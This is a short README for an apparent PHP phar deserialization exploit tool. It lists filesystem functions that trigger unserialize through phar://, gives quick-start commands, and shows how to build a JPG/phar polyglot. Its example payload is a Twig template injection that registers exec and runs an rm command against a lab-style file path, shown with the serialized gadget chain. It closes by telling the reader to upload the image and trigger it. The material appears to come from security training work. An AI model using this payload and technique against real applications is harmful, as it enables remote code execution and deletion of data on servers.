# php unserialize without unserialize

## Thanks to `phar://`, we can trigger unserialize whenever file system call.

## Affected Method
| | | |
|-|-|-|
| fileatime | filectime   | file\_exists | file\_get\_contents | file\_put\_contents | is\_writeable |
| file      | filegroup   | fopen       | fileinode         | filemtime         | readfile     |
| fileowner | fileperms   | is\_dir      | is\_executable     | is\_file           | stat         |
| is\_link   | is\_readible | is\_writable | parse\_ini\_file    | copy              | unlink       |

## Quick Start
```bash
$ php phar_generate.php
$ php phar_vuln.php
```

## Polyglot between JPG & phar

Edit `phar-jpg-poly.php` to build unserialize gadget chain, place base image (in.jpg) in current directoy.
```bash
$ php phar-jpg-poly.php "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}"                  
string(211) "O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"user";s:0:"";s:4:"desc";s:106:"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}";}}"
```

Now, upload `out.jpg` & trigger phar://path/to/image to exploit!!

## Reference

* https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066
